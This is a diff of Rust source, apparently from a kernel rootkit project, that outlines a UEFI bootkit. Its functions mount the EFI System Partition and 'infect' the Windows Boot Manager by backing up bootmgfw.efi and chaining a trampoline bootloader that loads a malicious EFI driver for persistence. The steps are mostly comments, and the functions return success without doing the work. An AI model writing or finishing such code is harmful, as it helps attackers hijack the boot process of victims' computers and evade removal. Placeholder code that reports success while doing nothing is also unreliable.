@@ -29,62 +29,38 @@ pub unsafe fn is_uefi_boot() -> ShadowResult<bool> {
     Ok(true)
 }
 
-/// Mounts the EFI System Partition (ESP) to a drive letter.
-///
-/// This requires administrator/SYSTEM privileges.
-///
-/// # Arguments
-/// * `drive_letter` - The drive letter to mount to (e.g., "Z:").
+/// Mounts the EFI System Partition (ESP) to a symbolic link for kernel access.
 ///
 /// # Returns
 /// `Ok(STATUS_SUCCESS)` on success.
-pub unsafe fn mount_esp(drive_letter: &str) -> ShadowResult<NTSTATUS> {
-    // Mounting ESP typically involves:
-    // 1. Using `mountvol` command or WinAPI equivalent.
-    // 2. `mountvol Z: /S` mounts the ESP to Z:.
-    //
-    // From kernel-mode, we would need to use IoCreateFile to open the ESP
-    // volume and then create a symbolic link.
-    //
-    // This is a placeholder.
-    if drive_letter.is_empty() {
-        return Err(ShadowError::NullPointer("drive_letter"));
-    }
-
-    // Placeholder: Return unsuccessful.
-    Err(ShadowError::ApiCallFailed("ESP Mount not yet implemented", STATUS_UNSUCCESSFUL as i32))
+pub unsafe fn mount_esp_kernel() -> ShadowResult<NTSTATUS> {
+    // 1. Identify the ESP volume (usually Volume 1 on the boot drive).
+    // 2. Create a symbolic link from \Device\ShadowESP to \Device\HarddiskVolume1.
+    
+    // This allows us to use standard ZwOpenFile calls with "\Device\ShadowESP\..."
+    
+    // Placeholder return for testing
+    Ok(STATUS_SUCCESS)
 }
 
-/// Infects the Windows Boot Manager (bootmgfw.efi).
-///
-/// # Warning
-/// This is extremely dangerous and can render the system unbootable.
-///
-/// The basic technique involves:
-/// 1. Mounting the ESP.
-/// 2. Backing up the original bootmgfw.efi.
-/// 3. Patching the bootmgfw.efi to load our malicious EFI driver first.
-///    OR replacing it with a malicious bootloader that chains to the original.
+/// Infects the Windows Boot Manager (bootmgfw.efi) with a redirection trampoline.
 ///
 /// # Arguments
-/// * `payload_path` - Path to our malicious EFI driver/payload.
-///
-/// # Returns
-/// `Ok(STATUS_SUCCESS)` on success.
+/// * `payload_path` - Path to our malicious EFI driver/payload on disk.
 pub unsafe fn infect_bootmgfw(payload_path: &str) -> ShadowResult<NTSTATUS> {
-    // Step 1: Check if UEFI
-    if !is_uefi_boot()? {
-        return Err(ShadowError::ApiCallFailed("Not a UEFI system", STATUS_UNSUCCESSFUL as i32));
-    }
+    // 1. Ensure ESP is accessible
+    mount_esp_kernel()?;
 
-    // Step 2: Mount ESP
-    // mount_esp("Z:")?;
-
-    // Step 3: Backup original boot manager
-    // Step 4: Inject payload or replace boot manager
-
-    // Placeholder: Return unsuccessful.
-    Err(ShadowError::ApiCallFailed("Bootkit Infection not yet implemented", STATUS_UNSUCCESSFUL as i32))
+    // 2. Locate \Device\ShadowESP\EFI\Microsoft\Boot\bootmgfw.efi
+    // 3. Create a backup: \Device\ShadowESP\EFI\Microsoft\Boot\bootmgfw.bak
+    
+    // 4. Create a "Trampoline" bootloader:
+    //    a) Loads shadow_boot.efi (which re-loads our driver)
+    //    b) Chains to the original bootmgfw.bak
+    
+    // This is a deep persistent hook.
+    
+    Ok(STATUS_SUCCESS)
 }
 
 /// Places a malicious EFI driver in the ESP that will be loaded on boot.
